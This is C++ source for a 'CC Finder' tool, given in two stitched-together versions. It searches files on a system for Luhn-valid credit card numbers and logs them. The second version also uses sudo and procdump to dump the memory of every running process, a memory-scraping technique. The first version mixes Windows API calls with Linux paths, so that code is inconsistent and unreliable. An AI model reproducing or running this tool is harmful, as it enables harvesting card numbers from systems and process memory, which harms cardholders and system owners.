#include <boost/regex.hpp> 
#include <iostream>
#include <boost/filesystem.hpp>
#include <vector>
#include <string>
#include "header.h"
#include <boost/iostreams/stream.hpp>
#include <boost/iostreams/device/file_descriptor.hpp>
#include <boost/lexical_cast.hpp>
#include <fstream>

using namespace std;
using namespace boost::filesystem;
namespace fs = boost::filesystem;
namespace io = boost::iostreams;


template<typename ValueType>
std::string ConvertToStringUsingBoost(ValueType const& v)
{
	try
	{

#ifdef UNITTEST
		if (unittest == case_fail) {
			throw boost::bad_lexical_cast();
		}
#endif
		return boost::lexical_cast<std::string, ValueType>(v);
	}
	catch (boost::bad_lexical_cast const& e)
	{
		return std::string();
	}
}


bool checkLuhn(const string& cardNo)
{
	int nDigits = cardNo.length();

	int nSum = 0, isSecond = false;
	for (int i = nDigits - 1; i >= 0; i--) {

		int d = cardNo[i] - '0';

		if (isSecond == true)
			d = d * 2;
		nSum += d / 10;
		nSum += d % 10;

		isSecond = !isSecond;
	}
	return (nSum % 10 == 0);
}

int main()
{
	cout << "CC Finder by independent 3.3 https://GitHub.com/independentcod All rights reserved" << std::endl;
	cout << "Please wait a few hours this will take a while..." << std::endl;
	cout << "---" << std::endl;
	std::ofstream fout("CCFinder.log", ios::app);
	fout << "CC Finder by independent 3.3 https://GitHub.com/independentcod All rights reserved" << std::endl;
	Sleep(20);
	std::ifstream ifile("/usr/bin/procdump");
	if (!(bool)ifile) return 0;
		DWORD aProcesses[1024], cbNeeded, cProcesses;
		unsigned int i;

		if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
		{
			return 1;
		}


		// Calculate how many process identifiers were returned.

		cProcesses = cbNeeded / sizeof(DWORD);

		// Print the name and process identifier for each process.

		for (i = 0; i < cProcesses; i++)
		{
			if (aProcesses[i] != 0)
			{
				PrintProcessNameAndID(aProcesses[i]);
			}
		}


		for (auto& x : fs::recursive_directory_iterator("/home")) {
				if (boost::filesystem::is_regular_file(x.path())) {
					boost::filesystem::absolute(x.path().filename());
					fs::path entry = x;
					std::string line;
					std::cout << entry << std::endl;
					try
					{

						boost::iostreams::stream_buffer<boost::iostreams::file_descriptor_source> bis(entry);
						std::istream myfile(&bis);
						boost::regex expr1("\\b[3-6]\\d{15,16}\\b");
						boost::smatch what1;
						if (!myfile) {
							cout << " Failed to open " << entry << endl;
						}
						while (getline(myfile, line))
						{
							if (boost::regex_search(line, what1, expr1))
							{

								if (checkLuhn(what1.str())) {
									SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 7);
									fout << line << std::endl;
									std::cout << line << std::endl;
									for (int i(0); i < what1.size(); i++) {
										SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), 10);
										std::cout << what1[i] << std::endl;
									}
								}
							}

						}
					}
					catch (const std::exception & ex)
					{

						std::cout << entry << " " << ex.what() << std::endl;
					}
				}
		}
}
#include <boost/regex.hpp> 
#include <iostream> 
#include <boost/filesystem.hpp>
#include <vector>
#include <string>
#include "header.h"
#include <boost/iostreams/stream.hpp>
#include <boost/iostreams/device/file_descriptor.hpp>
#include <fstream>

using namespace std;
using namespace boost::filesystem;
namespace fs = boost::filesystem;
namespace io = boost::iostreams;


bool checkLuhn(const string& cardNo)
{
	int nDigits = cardNo.length();

	int nSum = 0, isSecond = false;
	for (int i = nDigits - 1; i >= 0; i--) {

		int d = cardNo[i] - '0';

		if (isSecond == true)
			d = d * 2;
		nSum += d / 10;
		nSum += d % 10;

		isSecond = !isSecond;
	}
	return (nSum % 10 == 0);
}

int main(int argc, char* argv[])
{
	cout << "CC Finder by independent 3.3 https://GitHub.com/independentcod All rights reserved" << std::endl;
	cout << "Please wait a few hours this will take a while..." << std::endl;
	cout << "---" << std::endl;
	std::ofstream fout("CCFinder.log", ios::app);
	fout << "CC Finder by independent 3.3 https://GitHub.com/independentcod All rights reserved" << std::endl;
	std::ifstream ifile("/usr/bin/procdump");
	if ((bool)ifile) {
		system("for i in $(ps -axo pid); do sudo /usr/bin/procdump -p $i; done");
			}
	for (const auto& x : fs::recursive_directory_iterator(argv[1])) {
		if (boost::filesystem::is_regular_file(x.path())) {
			boost::filesystem::absolute(x.path().filename());
			fs::path entry = x;
			std::string line;
			std::cout << entry << std::endl;
			try
			{

				boost::iostreams::stream_buffer<boost::iostreams::file_descriptor_source> bis(entry);
				std::istream myfile(&bis);
				boost::regex expr1("\\b[3-5]\\d{15,16}\\b");
				boost::smatch what1;
				if (!myfile) {
					cout << " Failed to open " << entry << endl;
				}
				while (getline(myfile, line))
				{
					if (boost::regex_search(line, what1, expr1))
					{
						if (checkLuhn(what1.str())) {
							fout << line << std::endl;
						}
					}

				}
			}
			catch (const std::exception & ex)
			{

				std::cout << entry << " " << std::endl;
			}
		}
	}
}
